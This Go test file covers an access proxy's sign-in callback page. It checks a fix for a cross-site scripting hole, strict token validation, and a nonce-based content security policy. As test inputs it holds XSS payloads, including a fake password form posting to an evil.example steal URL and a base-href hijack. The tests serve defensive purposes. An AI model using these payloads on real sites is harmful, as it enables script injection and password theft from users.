package access

import (
	"net/http"
	"net/http/httptest"
	"net/url"
	"regexp"
	"strings"
	"testing"

	"go.uber.org/zap"

	"github.com/openidx/openidx/internal/common/config"
	"github.com/openidx/openidx/internal/common/middleware"
	"github.com/openidx/openidx/internal/oauth"
)

// THE PROXY'S SIGN-IN PAGE.
//
// GET /access/.auth/callback?login_session=<x> is public on every proxied
// host, and it used to put x into an inline script with fmt's %q, which does
// not escape < or /. A link carrying </script> closed the script and the rest
// was markup on the application's own origin: a password form posting
// anywhere, a <base>, or script wherever the policy allowed inline code. And
// the page's own script never ran, because the service-wide policy it was
// served under (script-src 'self') refuses inline script.
//
// Driven through RegisterRoutes behind the middleware cmd/access-service
// mounts, so the page's policy is the one a browser would actually receive.

const signInIssuer = "https://auth.example.test"

func signInRouter(t *testing.T) http.Handler {
	t.Helper()
	cfg := &config.Config{Environment: "production", OAuthIssuer: signInIssuer}
	return accessMainChain(t, NewService(nil, nil, cfg, zap.NewNop()), defaultOrgOnly{}, refuseBearerAPI)
}

func getSignInPage(t *testing.T, h http.Handler, loginSession string) *httptest.ResponseRecorder {
	t.Helper()
	req := httptest.NewRequest(http.MethodGet,
		"/access/.auth/callback?login_session="+url.QueryEscape(loginSession), nil)
	req.Host = "payroll.example.test"
	w := httptest.NewRecorder()
	h.ServeHTTP(w, req)
	return w
}

// The callback renders its page only for the login_session shape the OAuth
// service mints, and refuses everything else before anything is rendered.
func TestTheSignInPageRendersOnlyALoginSessionTheOAuthServiceMints(t *testing.T) {
	h := signInRouter(t)

	minted := oauth.GenerateRandomToken(32)
	w := getSignInPage(t, h, minted)
	if w.Code != http.StatusOK || !strings.HasPrefix(w.Header().Get("Content-Type"), "text/html") {
		t.Fatalf("a login_session the OAuth service minted (%q): %d %q, want the page", minted, w.Code, w.Header().Get("Content-Type"))
	}
	if !strings.Contains(w.Body.String(), `const loginSession = "`+minted+`";`) {
		t.Errorf("the page does not carry the minted login_session as a script string")
	}

	for _, hostile := range []string{
		`</script><script>alert(document.domain)</script>`,
		`"></script><form action="https://evil.example/steal"><input name="password"></form>`,
		`</script><base href="https://evil.example/">`,
		`'-alert(1)-'`,
		`%3C/script%3E`,                // encoded twice: still not the shape
		strings.Repeat("A", 43),        // unpadded
		strings.Repeat("A", 42) + "==", // a shorter token
		strings.Repeat("A", 44) + "=",  // a longer one
		strings.Repeat("A", 43) + "=<", // trailing markup
		strings.Repeat("A", 20) + "+/" + strings.Repeat("A", 21) + "=", // standard base64, not URL-safe
		"8f14e45f-ceea-467f-a0e6-2d7d0a3e9b1c",                         // a UUID
		strings.Repeat("A", 43) + "=\n",
	} {
		w := getSignInPage(t, h, hostile)
		if w.Code != http.StatusBadRequest {
			t.Errorf("login_session %q: %d, want 400", hostile, w.Code)
		}
		if body := w.Body.String(); strings.Contains(body, "<") || strings.Contains(body, hostile) {
			t.Errorf("login_session %q: the refusal carries markup or the value: %q", hostile, body)
		}
		if ct := w.Header().Get("Content-Type"); strings.HasPrefix(ct, "text/html") {
			t.Errorf("login_session %q: refused as %q, want no HTML at all", hostile, ct)
		}
	}
}

// The page is served under its own policy, and its own script and style run
// under that policy: each carries the response's nonce, the policy admits
// nothing else inline, and connect-src names the issuer the script posts the
// credentials to. An operator policy that allows inline script does not reach
// the page, and nothing lets it submit a form, set a base URL, embed an
// object or be framed.
func TestTheSignInPageScriptRunsUnderThePolicyItIsServedWith(t *testing.T) {
	// The operator policy that would have turned the old injection into
	// script execution.
	t.Setenv(middleware.CSPCustomEnvVar, "default-src * 'unsafe-inline' 'unsafe-eval'; script-src * 'unsafe-inline'")
	h := signInRouter(t)

	w := getSignInPage(t, h, oauth.GenerateRandomToken(32))
	if w.Code != http.StatusOK {
		t.Fatalf("sign-in page: %d %s", w.Code, w.Body.String())
	}
	policies := w.Header().Values("Content-Security-Policy")
	if len(policies) != 1 {
		t.Fatalf("the page carries %d Content-Security-Policy headers, want exactly one: %q", len(policies), policies)
	}
	csp := parseCSP(policies[0])

	scriptSrc := csp["script-src"]
	if len(scriptSrc) != 1 || !strings.HasPrefix(scriptSrc[0], "'nonce-") {
		t.Fatalf("script-src = %q, want the response's nonce and nothing else", scriptSrc)
	}
	nonce := strings.TrimSuffix(strings.TrimPrefix(scriptSrc[0], "'nonce-"), "'")
	if len(nonce) < 32 {
		t.Errorf("nonce %q is too short to be unguessable", nonce)
	}
	for directive, want := range map[string]string{
		"default-src":     "'none'",
		"style-src":       "'nonce-" + nonce + "'",
		"connect-src":     signInIssuer,
		"form-action":     "'none'",
		"base-uri":        "'none'",
		"object-src":      "'none'",
		"frame-ancestors": "'none'",
	} {
		if got := csp[directive]; len(got) != 1 || got[0] != want {
			t.Errorf("%s = %q, want %q", directive, got, want)
		}
	}

	page := w.Body.String()
	scripts := regexp.MustCompile(`(?is)<script\b([^>]*)>(.*?)</script>`).FindAllStringSubmatch(page, -1)
	if len(scripts) != 1 {
		t.Fatalf("the page has %d script elements, want its one", len(scripts))
	}
	if attrs := scripts[0][1]; strings.TrimSpace(attrs) != `nonce="`+nonce+`"` {
		t.Errorf("the page's script is %q, want it to carry the policy's nonce and no src", attrs)
	}
	// The script posts to the issuer, which is what connect-src must admit.
	body := scripts[0][2]
	if !strings.Contains(body, `const oauthURL = "`+signInIssuer+`";`) ||
		!strings.Contains(body, `fetch(oauthURL + '/oauth/login'`) ||
		!strings.Contains(body, `fetch(oauthURL + '/oauth/mfa-verify'`) {
		t.Errorf("the script does not post to the issuer's login and MFA endpoints:\n%s", body)
	}
	styles := regexp.MustCompile(`(?is)<style\b([^>]*)>`).FindAllStringSubmatch(page, -1)
	if len(styles) != 1 || strings.TrimSpace(styles[0][1]) != `nonce="`+nonce+`"` {
		t.Errorf("style elements %q, want one carrying the policy's nonce", styles)
	}
	// Nothing inline that a nonce cannot cover: no event-handler or style
	// attributes, no javascript: URLs, nothing that sets a base or embeds.
	for _, forbidden := range []*regexp.Regexp{
		regexp.MustCompile(`(?i)<[^>]+\son[a-z]+\s*=`),
		regexp.MustCompile(`(?i)<[^>]+\sstyle\s*=`),
		regexp.MustCompile(`(?i)javascript:`),
		regexp.MustCompile(`(?i)<(base|object|embed|iframe|link)\b`),
		regexp.MustCompile(`(?i)<form\b[^>]*\saction\s*=`),
	} {
		if m := forbidden.FindString(page); m != "" {
			t.Errorf("the page carries %q, which its policy would block or which escapes it", m)
		}
	}
	if w.Header().Get("Cache-Control") != "no-store" {
		t.Errorf("Cache-Control = %q, want no-store for a page holding a login_session", w.Header().Get("Cache-Control"))
	}

	// A nonce is good for one response.
	again := getSignInPage(t, h, oauth.GenerateRandomToken(32))
	if next := parseCSP(again.Header().Get("Content-Security-Policy"))["script-src"]; len(next) != 1 || next[0] == scriptSrc[0] {
		t.Errorf("the second page reused the nonce: %q", next)
	}

	// Everything else the service serves keeps the service-wide policy.
	req := httptest.NewRequest(http.MethodGet, "/access/.auth/session", nil)
	rec := httptest.NewRecorder()
	h.ServeHTTP(rec, req)
	if got := rec.Header().Get("Content-Security-Policy"); !strings.Contains(got, "'unsafe-inline'") {
		t.Errorf("another route's policy = %q, want the operator's service-wide one", got)
	}
}

// The pattern is the first layer; the template is the second. Rendered
// directly with a value the callback would refuse, the page still has one
// script element and the value stays inside a JavaScript string.
func TestTheSignInPageEscapesWhatItCarries(t *testing.T) {
	hostile := `</script><script>alert(document.domain)</script><base href="//evil.example/">`
	var page strings.Builder
	if err := loginPageTemplate.Execute(&page, loginPageData{
		Nonce: "00112233445566778899aabbccddeeff", LoginSession: hostile, OAuthURL: `https://auth.example.test/"</script>`,
	}); err != nil {
		t.Fatalf("render: %v", err)
	}
	out := page.String()
	if n := strings.Count(strings.ToLower(out), "<script"); n != 1 {
		t.Errorf("the page has %d script elements, want 1:\n%s", n, out)
	}
	if strings.Contains(out, "</script><script>") || strings.Contains(strings.ToLower(out), "<base") {
		t.Errorf("a carried value became markup:\n%s", out)
	}
}

// parseCSP splits a policy into its directives' source lists.
func parseCSP(policy string) map[string][]string {
	out := map[string][]string{}
	for _, d := range strings.Split(policy, ";") {
		fields := strings.Fields(d)
		if len(fields) == 0 {
			continue
		}
		out[strings.ToLower(fields[0])] = fields[1:]
	}
	return out
}
